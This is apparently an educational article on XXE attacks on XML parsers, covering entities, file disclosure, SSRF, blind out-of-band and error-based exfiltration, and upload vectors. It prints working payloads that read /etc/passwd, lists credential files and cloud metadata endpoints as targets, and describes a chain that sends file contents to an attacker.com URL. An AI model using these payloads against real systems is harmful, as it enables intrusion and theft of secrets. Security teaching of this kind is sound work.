## Core Mechanics: How XML Parsers Become Attack Vectors

Core Mechanics: How XML Parsers Become Attack Vectors
The vulnerability of XML parsers to XXE attacks lies in their handling of entities, particularly external entities, which are defined within a Document Type Definition (DTD) .

Entities and DTDs

• Entities: In XML, entities are like variables that can store pieces of data, be it a character string, XML markup, or the content of an external resource. They are defined within a DTD .
• Document Type Definition (DTD): A DTD specifies the structure and elements of an XML document. It can be defined internally within the XML document itself or externally by referencing a separate file .
• External Entities: These entities are defined using a SYSTEM identifier, which specifies a Uniform Resource Identifier (URI) pointing to an external resource. This URI can be a local file path (file://) or a network URL (http://, ftp://, etc.) .
The Exploitation Chain
When an XML parser encounters an XML document containing a DTD that declares an external entity, and the parser is configured to process external entities, it performs the following:

1. Dereferencing the URI: The parser resolves the URI specified in the SYSTEM identifier. 2. Fetching External Content: If the URI points to a local file, the parser reads its contents. If it points to a URL, the parser initiates an HTTP (or other protocol) request to fetch the resource. 3. Substitution: The parser replaces the entity reference in the XML document with the fetched content .

For example, a basic XXE payload like the following:

<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root>&xxe;</root>

If processed by a vulnerable parser, the &xxe; reference would be replaced by the contents of /etc/passwd, potentially exposing this sensitive file .

Parameter Entities vs. General Entities
A critical distinction exists between general entities and parameter entities, especially in the context of XXE attacks:

• General Entities: These are the standard entities used in the main body of an XML document and are typically referenced using &entityName;. They can be used to embed data directly into the XML content.
• Parameter Entities: These are specifically defined for use within DTDs and are declared using . They are referenced using %parameterEntityName;. Parameter entities are crucial for constructing more complex attack chains, especially when direct entity resolution is filtered or when building external DTDs . A common limitation is that parameter entities cannot typically be referenced from within the main XML document body, only within the DTD itself .

## Notable Techniques: Beyond Basic File Disclosure

Notable Techniques: Beyond Basic File Disclosure
While the fundamental mechanism of XXE is straightforward, the techniques employed by attackers have evolved to bypass filters, exfiltrate data out-of-band, and achieve more impactful results.

1. File Disclosure and Data Exfiltration
The most direct application of XXE is to read local files. By crafting an external entity that points to a sensitive file and including its reference within an XML element that is returned in the response, an attacker can obtain the file's contents .

Commonly targeted files include:

• /etc/passwd, /etc/shadow (Linux user and password information) 
• /etc/hostname, /etc/issue, /etc/hosts (System identification and network configuration) 
• /proc/self/environ, /proc/self/cmdline (Process environment and command-line arguments) 
• SSH private keys (~/.ssh/id_rsa) 
• Cloud instance metadata endpoints (e.g., http://169.254.169.254/) 
• Application configuration files (e.g., .env, database connection strings) 
• Windows files like c:\windows\win.ini, c:\boot.ini 
For files containing characters that could break XML structure (like newlines or XML special characters), PHP filter wrappers or other encoding mechanisms can be used. php://filter/convert.base64-encode/resource=/path/to/file is a common technique to base64 encode the file's content before exfiltration .

2. Server-Side Request Forgery (SSRF)
Instead of referencing local files, an external entity can point to any accessible URL. This transforms the XXE vulnerability into a Server-Side Request Forgery (SSRF) vulnerability, allowing the attacker to use the vulnerable server as a proxy to make requests to internal or external systems .

This is invaluable for:

• Internal Network Reconnaissance: Probing internal IPs and ports that are not directly accessible from the internet .
• Accessing Cloud Metadata Services: Retrieving temporary credentials for cloud instances (e.g., AWS IMDS) .
• Interacting with Internal APIs: Forcing requests to sensitive internal endpoints .
The SSRF primitive can be used in a blind manner if the response from the internal request is not reflected, but the side-effect of the request (e.g., a response on an attacker-controlled server) can still confirm its success .

3. Blind XXE and Out-of-Band (OOB) Exfiltration
When applications do not reflect the results of XXE processing directly in their responses (e.g., no reflected error messages or data), the attack becomes "blind" . In these scenarios, attackers must rely on out-of-band (OOB) communication channels to detect and exfiltrate data.

a. HTTP/DNS Out-of-Band Interaction
The most common OOB technique involves triggering the vulnerable server to make an HTTP request to an attacker-controlled server. This is achieved by defining an external entity pointing to the attacker's server and then invoking it. The attacker monitors their server logs for incoming requests, which confirm the XXE vulnerability .

A malicious external DTD is often hosted on the attacker's server. This DTD contains the logic to read a file and construct a URL with the file content as a query parameter, which is then requested by the vulnerable server .

A typical chain involves:

1. Defining a parameter entity %file to read a local file (file:///etc/hostname). 2. Defining another parameter entity %eval to dynamically declare an exfiltration entity %exfil that constructs a URL like http://attacker.com/?x=%file;. 3. Invoking %eval; followed by %exfil; to trigger the HTTP request .

Even if direct HTTP requests are blocked, DNS lookups can sometimes be used for OOB exfiltration by encoding data within subdomains .

b. Error-Based Blind XXE
If the application returns verbose error messages, attackers can craft payloads that trigger parsing errors containing sensitive data. For example, attempting to access a non-existent file whose name is constructed from the contents of a sensitive file can leak that file's content within the error message .

A common pattern involves defining an entity to read a file and then attempting to load a non-existent resource using that file's content as part of the path:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error SYSTEM "file:///nonexistent/%file;"> %error;

When the parser fails to find /nonexistent/root:x:0:0:root:/root:/bin/bash, the error message will contain the sensitive data .

4. Exploiting File Uploads
Applications that accept file uploads, particularly those that process XML-based formats, are susceptible to XXE. The server-side parsing of these files can trigger XXE vulnerabilities.

• Office Open XML (OOXML): Formats like .docx, .xlsx, and .pptx are essentially ZIP archives containing XML files. By modifying files within these archives (e.g., word/document.xml or xl/workbook.xml) to include malicious XXE payloads before re-zipping, attackers can exploit parsers processing these documents . Tools like oxml_xxe and Docem facilitate this process .
• SVG (Scalable Vector Graphics): SVG files are XML-based images. Embedding XXE payloads within an SVG can lead to XXE exploitation if the application processes these images server-side .
• GPX (GPS Exchange Format): This XML-based format used for GPS data can also be weaponized for XXE .
5. Exploiting Other Protocols and Wrappers
Beyond file:// and http://, XML parsers might support other protocols, expanding the attack surface.

• jar:// Protocol: In Java environments, this protocol can be used to access files within JAR archives, enabling XXE exploitation within compressed Java libraries .
• ftp:// Protocol: Useful for exfiltrating data when HTTP OOB is problematic or when dealing with multi-line content that might break URLs. Requires an FTP server listener .
• gopher:// Protocol: Before being deprecated in Java 1.7+, gopher:// was powerful for initiating arbitrary TCP connections, enabling sophisticated SSRF and data exfiltration .
• expect:// PHP Wrapper: On PHP servers with the expect extension enabled, this wrapper can be used to execute arbitrary system commands, escalating XXE to Remote Code Execution (RCE) .
6. Local DTD Reuse
In environments where direct OOB connections are blocked, attackers might exploit the presence of legitimate DTD files on the server. By crafting an XXE payload that forces the parser to load a local DTD and then redefines entities within that DTD, attackers can achieve data exfiltration or trigger errors with sensitive information . Tools like dtd-finder can assist in locating such DTDs .